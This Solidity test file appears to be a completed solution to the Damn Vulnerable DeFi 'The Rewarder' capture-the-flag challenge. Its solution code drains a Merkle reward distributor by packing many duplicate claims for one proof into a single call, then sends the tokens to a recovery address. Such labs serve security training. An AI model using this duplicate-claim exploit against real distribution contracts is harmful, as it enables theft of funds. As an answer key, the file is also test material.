// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {Merkle} from "murky/Merkle.sol";
import {WETH} from "solmate/tokens/WETH.sol";
import {TheRewarderDistributor, Distribution, Claim} from "../../src/the-rewarder/TheRewarderDistributor.sol";
import {IERC20} from "@openzeppelin/contracts/interfaces/IERC20.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";

contract TheRewarderChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address alice = makeAddr("alice");
    address recovery = makeAddr("recovery");

    uint256 constant BENEFICIARIES_AMOUNT = 1000;
    uint256 constant TOTAL_DVT_DISTRIBUTION_AMOUNT = 10 ether;
    uint256 constant TOTAL_WETH_DISTRIBUTION_AMOUNT = 1 ether;

    // Alice is the address at index 2 in the distribution files
    uint256 constant ALICE_DVT_CLAIM_AMOUNT = 2502024387994809;
    uint256 constant ALICE_WETH_CLAIM_AMOUNT = 228382988128225;

    TheRewarderDistributor distributor;

    // Instance of Murky's contract to handle Merkle roots, proofs, etc.
    Merkle merkle;

    // Distribution data for Damn Valuable Token (DVT)
    DamnValuableToken dvt;
    bytes32 dvtRoot;

    // Distribution data for WETH
    WETH weth;
    bytes32 wethRoot;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);

        // Deploy tokens to be distributed
        dvt = new DamnValuableToken();
        weth = new WETH();
        weth.deposit{value: TOTAL_WETH_DISTRIBUTION_AMOUNT}();

        // Calculate roots for DVT and WETH distributions
        bytes32[] memory dvtLeaves = _loadRewards("/test/the-rewarder/dvt-distribution.json");
        bytes32[] memory wethLeaves = _loadRewards("/test/the-rewarder/weth-distribution.json");
        merkle = new Merkle();
        dvtRoot = merkle.getRoot(dvtLeaves);
        wethRoot = merkle.getRoot(wethLeaves);

        // Deploy distributor
        distributor = new TheRewarderDistributor();

        // Create DVT distribution
        dvt.approve(address(distributor), TOTAL_DVT_DISTRIBUTION_AMOUNT);
        distributor.createDistribution({
            token: IERC20(address(dvt)),
            newRoot: dvtRoot,
            amount: TOTAL_DVT_DISTRIBUTION_AMOUNT
        });

        // Create WETH distribution
        weth.approve(address(distributor), TOTAL_WETH_DISTRIBUTION_AMOUNT);
        distributor.createDistribution({
            token: IERC20(address(weth)),
            newRoot: wethRoot,
            amount: TOTAL_WETH_DISTRIBUTION_AMOUNT
        });

        // Let's claim rewards for Alice.

        // Set DVT and WETH as tokens to claim
        IERC20[] memory tokensToClaim = new IERC20[](2);
        tokensToClaim[0] = IERC20(address(dvt));
        tokensToClaim[1] = IERC20(address(weth));

        // Create Alice's claims
        Claim[] memory claims = new Claim[](2);

        // First, the DVT claim
        claims[0] = Claim({
            batchNumber: 0, // claim corresponds to first DVT batch
            amount: ALICE_DVT_CLAIM_AMOUNT,
            tokenIndex: 0, // claim corresponds to first token in `tokensToClaim` array
            proof: merkle.getProof(dvtLeaves, 2) // Alice's address is at index 2
        });

        // And then, the WETH claim
        claims[1] = Claim({
            batchNumber: 0, // claim corresponds to first WETH batch
            amount: ALICE_WETH_CLAIM_AMOUNT,
            tokenIndex: 1, // claim corresponds to second token in `tokensToClaim` array
            proof: merkle.getProof(wethLeaves, 2) // Alice's address is at index 2
        });

        // Alice claims once
        vm.startPrank(alice);
        distributor.claimRewards({inputClaims: claims, inputTokens: tokensToClaim});

        // Alice cannot claim twice
        vm.expectRevert(TheRewarderDistributor.AlreadyClaimed.selector);
        distributor.claimRewards({inputClaims: claims, inputTokens: tokensToClaim});
        vm.stopPrank(); // stop alice prank

        vm.stopPrank(); // stop deployer prank
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        // Deployer owns distributor
        assertEq(distributor.owner(), deployer);

        // Batches created with expected roots
        assertEq(distributor.getNextBatchNumber(address(dvt)), 1);
        assertEq(distributor.getRoot(address(dvt), 0), dvtRoot);
        assertEq(distributor.getNextBatchNumber(address(weth)), 1);
        assertEq(distributor.getRoot(address(weth), 0), wethRoot);

        // Alice claimed tokens
        assertEq(dvt.balanceOf(alice), ALICE_DVT_CLAIM_AMOUNT);
        assertEq(weth.balanceOf(alice), ALICE_WETH_CLAIM_AMOUNT);

        // After Alice's claim, distributor still has enough tokens to distribute
        uint256 expectedDVTLeft = TOTAL_DVT_DISTRIBUTION_AMOUNT - ALICE_DVT_CLAIM_AMOUNT;
        assertEq(dvt.balanceOf(address(distributor)), expectedDVTLeft);
        assertEq(distributor.getRemaining(address(dvt)), expectedDVTLeft);

        uint256 expectedWETHLeft = TOTAL_WETH_DISTRIBUTION_AMOUNT - ALICE_WETH_CLAIM_AMOUNT;
        assertEq(weth.balanceOf(address(distributor)), expectedWETHLeft);
        assertEq(distributor.getRemaining(address(weth)), expectedWETHLeft);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
// Constants for claim amounts
    uint256 private constant PLAYER_DVT_CLAIM_AMOUNT = 11524763827831882;
    uint256 private constant PLAYER_WETH_CLAIM_AMOUNT = 1171088749244340;

    function test_theRewarder() public checkSolvedByPlayer {
        // Calculate how many transactions needed for each token based on claim amounts
        uint256 dvtTransactions = calculateTransactionCount(
            TOTAL_DVT_DISTRIBUTION_AMOUNT,
            PLAYER_DVT_CLAIM_AMOUNT
        );
        uint256 wethTransactions = calculateTransactionCount(
            TOTAL_WETH_DISTRIBUTION_AMOUNT,
            PLAYER_WETH_CLAIM_AMOUNT
        );
        uint256 totalTransactions = dvtTransactions + wethTransactions;

        // Setup token array
        IERC20[] memory tokensToClaimArray = setupTokenArray();

        // Generate Merkle proofs
        bytes32[] memory dvtLeaves = _loadRewards("/test/the-rewarder/dvt-distribution.json");
        bytes32[] memory wethLeaves = _loadRewards("/test/the-rewarder/weth-distribution.json");

        // Setup claims array
        Claim[] memory claimsArray = new Claim[](totalTransactions);

        // Fill DVT claims
        for (uint256 i = 0; i < dvtTransactions; i++) {
            claimsArray[i] = createClaim({
                batchNum: 0,
                claimAmount: PLAYER_DVT_CLAIM_AMOUNT,
                tokenIdx: 0,
                proofLeaves: dvtLeaves,
                merkleIndex: 188
            });
        }

        // Fill WETH claims
        for (uint256 i = dvtTransactions; i < totalTransactions; i++) {
            claimsArray[i] = createClaim({
                batchNum: 0,
                claimAmount: PLAYER_WETH_CLAIM_AMOUNT,
                tokenIdx: 1,
                proofLeaves: wethLeaves,
                merkleIndex: 188
            });
        }

        // Execute claims
        distributor.claimRewards({
            inputClaims: claimsArray,
            inputTokens: tokensToClaimArray
        });

        // Transfer claimed tokens to recovery address
        transferToRecovery();
    }

// Helper function to calculate number of transactions needed
    function calculateTransactionCount(uint256 total, uint256 claimAmount) private pure returns (uint256) {
        return total / claimAmount;
    }

// Helper function to setup token array
    function setupTokenArray() private view returns (IERC20[] memory) {
        IERC20[] memory tokens = new IERC20[](2);
        tokens[0] = IERC20(address(dvt));
        tokens[1] = IERC20(address(weth));
        return tokens;
    }

// Helper function to create a claim
    function createClaim(
        uint256 batchNum,
        uint256 claimAmount,
        uint256 tokenIdx,
        bytes32[] memory proofLeaves,
        uint256 merkleIndex
    ) private view returns (Claim memory) {
        return Claim({
            batchNumber: batchNum,
            amount: claimAmount,
            tokenIndex: tokenIdx,
            proof: merkle.getProof(proofLeaves, merkleIndex)
        });
    }

// Helper function to transfer tokens to recovery
    function transferToRecovery() private {
        dvt.transfer(recovery, dvt.balanceOf(player));
        weth.transfer(recovery, weth.balanceOf(player));
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Player saved as much funds as possible, perhaps leaving some dust
        assertLt(dvt.balanceOf(address(distributor)), 1e16, "Too much DVT in distributor");
        assertLt(weth.balanceOf(address(distributor)), 1e15, "Too much WETH in distributor");

        // All funds sent to the designated recovery account
        assertEq(
            dvt.balanceOf(recovery),
            TOTAL_DVT_DISTRIBUTION_AMOUNT - ALICE_DVT_CLAIM_AMOUNT - dvt.balanceOf(address(distributor)),
            "Not enough DVT in recovery account"
        );
        assertEq(
            weth.balanceOf(recovery),
            TOTAL_WETH_DISTRIBUTION_AMOUNT - ALICE_WETH_CLAIM_AMOUNT - weth.balanceOf(address(distributor)),
            "Not enough WETH in recovery account"
        );
    }

    struct Reward {
        address beneficiary;
        uint256 amount;
    }

    // Utility function to read rewards file and load it into an array of leaves
    function _loadRewards(string memory path) private view returns (bytes32[] memory leaves) {
        Reward[] memory rewards =
                            abi.decode(vm.parseJson(vm.readFile(string.concat(vm.projectRoot(), path))), (Reward[]));
        assertEq(rewards.length, BENEFICIARIES_AMOUNT);

        leaves = new bytes32[](BENEFICIARIES_AMOUNT);
        for (uint256 i = 0; i < BENEFICIARIES_AMOUNT; i++) {
            leaves[i] = keccak256(abi.encodePacked(rewards[i].beneficiary, rewards[i].amount));
        }
    }
}
